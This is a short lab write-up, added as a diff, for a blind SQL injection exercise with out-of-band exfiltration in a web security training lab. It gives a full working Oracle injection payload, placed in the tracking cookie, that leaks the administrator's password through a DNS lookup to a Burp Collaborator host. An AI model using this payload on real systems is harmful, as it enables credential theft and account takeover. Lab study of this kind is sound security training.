@@ -1,0 +1,15 @@
+Lab #16 - Blind SQL injection with out-of-band data exfiltration
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+ 1- Exploit SQLi to output the password for the administrator user
+ 2- Login as administrator
+
+ Analysis:
+
+ We know it is an oracle database from the lab 15, so we can grab the data exfiltration payload from the cheatsheet and just add some extras (check Lab 15 notes)
+Burp Collaborator - i0jawmxvizideb76bkfghi72dtjj78.burpcollaborator.net
+ ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.i0jawmxvizideb76bkfghi72dtjj78.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+
+ After running that in Repeater right after the TrackingId, you can Poll collaborator to see the password in the DNS request in between "http://" and the collaborator subdomain.
